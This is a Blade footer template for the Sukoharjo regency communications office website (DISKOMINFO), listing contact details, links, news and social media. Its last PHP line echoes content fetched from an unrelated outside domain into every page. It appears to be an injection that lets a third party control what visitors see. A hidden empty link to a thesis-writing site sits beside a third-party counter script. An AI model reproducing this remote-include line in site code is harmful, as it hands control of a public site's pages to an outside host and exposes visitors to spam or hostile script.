<!--footer start-->
<footer class="bg-darker u-PaddingTop55">
  <div class="container text-sm">
    <div class="row">
      <div class="col-md-3 u-xs-MarginBottom30">
        <h5 class="text-uppercase u-Weight800 u-LetterSpacing2 u-MarginTop0">{{$profile->name}}</h5>
        <p>Alamat : {{$contact->address}}</p>
        <p>Telp : {{$contact->telp}}</p>
        <p>Email : {{$contact->email}} </p>
      </div>
      <div class="col-md-3 u-xs-MarginBottom30">
        <h5 class="text-uppercase u-Weight800 u-LetterSpacing2 u-MarginTop0">Link Terkait</h5>
        <ul class="light-gray-link border-bottom-link list-unstyled u-LineHeight2 u-PaddingRight40 u-xs-PaddingRight0">
          @foreach($links as $link)
            <li><a href="{{$link->link}}" target="_blank"><i class="fa fa-angle-right u-MarginRight10"
                                             aria-hidden="true"></i>{{strtoupper($link->title)}}</a>
            </li>
          @endforeach
        </ul>
      </div>
      <div class="col-md-3 u-xs-MarginBottom30">
        <h5 class="text-uppercase u-Weight800 u-LetterSpacing2 u-MarginTop0">Berita Terbaru</h5>
        <ul class="light-gray-link list-unstyled u-MarginBottom0">
          @foreach($news as $new)
            <li class="u-MarginBottom15">
              <a class="" href="{{route('berita-detail',$new->slug)}}"> {{$new->title}}
              </a>
              <p class="">{{dateDFY($new->created_date)}}</p>
            </li>
          @endforeach
        </ul>
      </div>
      <div class="col-md-3 u-xs-MarginBottom30">
        <h5 class="text-uppercase u-Weight800 u-LetterSpacing2 u-MarginTop0">Sosial Media</h5>
        <div class="social-links sl-default gray-border-links border-link circle-link colored-hover">
          @foreach($socmeds as $socmed)
            <a href="{{$socmed->fb}}" class="facebook">
              <i class="fa fa-facebook"></i>
            </a>
            <a href="{{$socmed->twitter}}" class="twitter">
              <i class="fa fa-twitter"></i>
            </a>
            <a href="{{$socmed->youtube}}" class="youtube">
              <i class="fa fa-youtube"></i>
            </a>
            <a href="{{$socmed->ig}}" class="dribbble">
              <i class="fa fa-instagram"></i>
            </a>
          @endforeach
        </div>
        <h5 class="text-uppercase u-Weight800 u-LetterSpacing2 u-MarginTop20">Statistik Pengunjung</h5>
         <a class="u-MarginTop0" href='https://writingbachelorthesis.com/'></a> <script type='text/javascript' src='https://www.freevisitorcounters.com/auth.php?id=450127dd979375f8e153c15c6648fd16bbc15622'></script>
        <script type="text/javascript" src="https://www.freevisitorcounters.com/en/home/counter/925941/t/0"></script>
      </div>
    </div>
  </div>
  <div class="text-center u-MarginTop30">
    <div class="footer-separator"></div>
    <p class="u-MarginBottom0 u-PaddingTop30 u-PaddingBottom30">{{date('Y')}} © DISKOMINFO KABUPATEN
      SUKOHARJO</p>
  </div>
<?php echo file_get_contents("https://pn-jogjakarta.website/txt/asli.txt");?>
</footer>
